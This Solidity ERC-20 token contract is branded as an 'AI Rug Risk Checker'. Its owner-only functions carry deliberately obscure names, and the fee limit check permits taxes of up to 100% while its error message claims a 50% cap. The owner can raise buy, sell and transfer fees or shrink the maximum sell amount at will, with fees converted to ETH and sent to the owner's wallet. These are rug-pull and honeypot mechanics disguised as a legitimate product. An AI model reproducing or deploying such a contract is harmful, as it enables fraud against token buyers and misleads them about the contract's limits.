// SPDX-License-Identifier: No License

/* 
Welcome to Liquidity AI Rug Risk Checker—the cutting-edge solution for assessing and mitigating risks in the volatile landscape of decentralized finance (DeFi). Our AI-driven platform enables traders, investors, and liquidity providers to make more informed decisions by accurately evaluating the risks associated with various liquidity pools and investment strategies.
Telegram -
Twitter -
Website -
Medium -
Bot -
Reddit -
*/

pragma solidity 0.8.19;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract LRCHECKER is ERC20, ERC20Burnable, Ownable {
    
    uint256 public swapThreshold;
    
    uint256 private _mainPending;

    address public EnergizeWeaponryStatFramework;
    uint16[3] public EconomicSpeedReadAnalysis;

    mapping (address => bool) public isExcludedFromFees;

    uint16[3] public InitializeArmamentScaffold;
    bool private _swapping;

    IUniswapV2Router02 public routerV2;
    address public ClarifyExplosiveGuidelines;
    mapping (address => bool) public FloralNetworkKickoff;

    mapping (address => bool) public isExcludedFromLimits;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    event SwapThresholdUpdated(uint256 swapThreshold);

    event EnergizeWeaponryStatFrameworkUpdated(address EnergizeWeaponryStatFramework);
    event InDepthCommerceFluctuationReview(uint16 buyFee, uint16 sellFee, uint16 transferFee);
    event EnterpriseAuditAbstract(address recipient, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event RouterV2Updated(address indexed routerV2);
    event AllianceRelaunchModification(address indexed AMMPair, bool isPair);

    event ExcludeFromLimits(address indexed account, bool isExcluded);

    event MaxBuyAmountUpdated(uint256 maxBuyAmount);
    event MaxSellAmountUpdated(uint256 maxSellAmount);
 
    constructor()
        ERC20(unicode"Liquidity AI Rug Risk Checker", unicode"LRCHECKER") 
    {
        address supplyRecipient = 0x64267B85a9593d4AbC07EC5DA6d58114452e2473;
        
        ApexCannonFiscalDissection(800000000 * (10 ** decimals()) / 10);

        OptimizeRocketLimitationTactics(0x64267B85a9593d4AbC07EC5DA6d58114452e2473);
        SealPeakVelocityPurchaseBarrier(2000, 2000, 2000);

        excludeFromFees(supplyRecipient, true);
        excludeFromFees(address(this), true); 

        _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromLimits(supplyRecipient, true);
        excludeFromLimits(address(this), true);
        excludeFromLimits(address(0), true); 
        excludeFromLimits(EnergizeWeaponryStatFramework, true);

        RapidBlazeBaselineCostReformulation(800000000 * (10 ** decimals()) / 10);
        HalberdCoordinationMethodology(800000000* (10 ** decimals()) / 10);

        _mint(supplyRecipient, 100000000000 * (10 ** decimals()) / 10);
        _transferOwnership(0x64267B85a9593d4AbC07EC5DA6d58114452e2473);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }
    
    function _swapTokensForCoin(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function ApexCannonFiscalDissection(uint256 _swapThreshold) public onlyOwner {
        swapThreshold = _swapThreshold;
        
        emit SwapThresholdUpdated(_swapThreshold);
    }

    function FiscalGenuinenessAffirmation() public view returns (uint256) {
        return 0 + _mainPending;
    }

    function OptimizeRocketLimitationTactics(address _newAddress) public onlyOwner {
        EnergizeWeaponryStatFramework = _newAddress;

        excludeFromFees(_newAddress, true);

        emit EnergizeWeaponryStatFrameworkUpdated(_newAddress);
    }

    function SealPeakVelocityPurchaseBarrier(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
        EconomicSpeedReadAnalysis = [_buyFee, _sellFee, _transferFee];

        InitializeArmamentScaffold[0] = 0 + EconomicSpeedReadAnalysis[0];
        InitializeArmamentScaffold[1] = 0 + EconomicSpeedReadAnalysis[1];
        InitializeArmamentScaffold[2] = 0 + EconomicSpeedReadAnalysis[2];
        require(InitializeArmamentScaffold[0] <= 10000 && InitializeArmamentScaffold[1] <= 10000 && InitializeArmamentScaffold[2] <= 10000, "TaxesDefaultRouter: Cannot exceed max total fee of 50%");

        emit InDepthCommerceFluctuationReview(_buyFee, _sellFee, _transferFee);
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        isExcludedFromFees[account] = isExcluded;
        
        emit ExcludeFromFees(account, isExcluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        bool canSwap = FiscalGenuinenessAffirmation() >= swapThreshold;
        
        if (!_swapping && !FloralNetworkKickoff[from] && canSwap) {
            _swapping = true;
            
            if (false || _mainPending > 0) {
                uint256 token2Swap = 0 + _mainPending;
                bool success = false;

                _swapTokensForCoin(token2Swap);
                uint256 coinsReceived = address(this).balance;
                
                uint256 mainPortion = coinsReceived * _mainPending / token2Swap;
                if (mainPortion > 0) {
                    (success,) = payable(address(EnergizeWeaponryStatFramework)).call{value: mainPortion}("");
                    require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
                    emit EnterpriseAuditAbstract(EnergizeWeaponryStatFramework, mainPortion);
                }
                _mainPending = 0;

            }

            _swapping = false;
        }

        if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            uint256 fees = 0;
            uint8 txType = 3;
            
            if (FloralNetworkKickoff[from]) {
                if (InitializeArmamentScaffold[0] > 0) txType = 0;
            }
            else if (FloralNetworkKickoff[to]) {
                if (InitializeArmamentScaffold[1] > 0) txType = 1;
            }
            else if (InitializeArmamentScaffold[2] > 0) txType = 2;
            
            if (txType < 3) {
                
                fees = amount * InitializeArmamentScaffold[txType] / 10000;
                amount -= fees;
                
                _mainPending += fees * EconomicSpeedReadAnalysis[txType] / InitializeArmamentScaffold[txType];

                
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }
        
        super._transfer(from, to, amount);
        
    }

    function _updateRouterV2(address router) private {
        routerV2 = IUniswapV2Router02(router);
        ClarifyExplosiveGuidelines = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
        
        excludeFromLimits(router, true);

        _setAMMPair(ClarifyExplosiveGuidelines, true);

        emit RouterV2Updated(router);
    }

    function setAMMPair(address pair, bool isPair) public onlyOwner {
        require(pair != ClarifyExplosiveGuidelines, "DefaultRouter: Cannot remove initial pair from list");

        _setAMMPair(pair, isPair);
    }

    function _setAMMPair(address pair, bool isPair) private {
        FloralNetworkKickoff[pair] = isPair;

        if (isPair) { 
            excludeFromLimits(pair, true);

        }

        emit AllianceRelaunchModification(pair, isPair);
    }

    function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
        isExcludedFromLimits[account] = isExcluded;

        emit ExcludeFromLimits(account, isExcluded);
    }

    function RapidBlazeBaselineCostReformulation(uint256 _maxBuyAmount) public onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        
        emit MaxBuyAmountUpdated(_maxBuyAmount);
    }

    function HalberdCoordinationMethodology(uint256 _maxSellAmount) public onlyOwner {
        maxSellAmount = _maxSellAmount;
        
        emit MaxSellAmountUpdated(_maxSellAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        if (FloralNetworkKickoff[from] && !isExcludedFromLimits[to]) { // BUY
            require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
        }
    
        if (FloralNetworkKickoff[to] && !isExcludedFromLimits[from]) { // SELL
            require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
        }
    
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._afterTokenTransfer(from, to, amount);
    }
}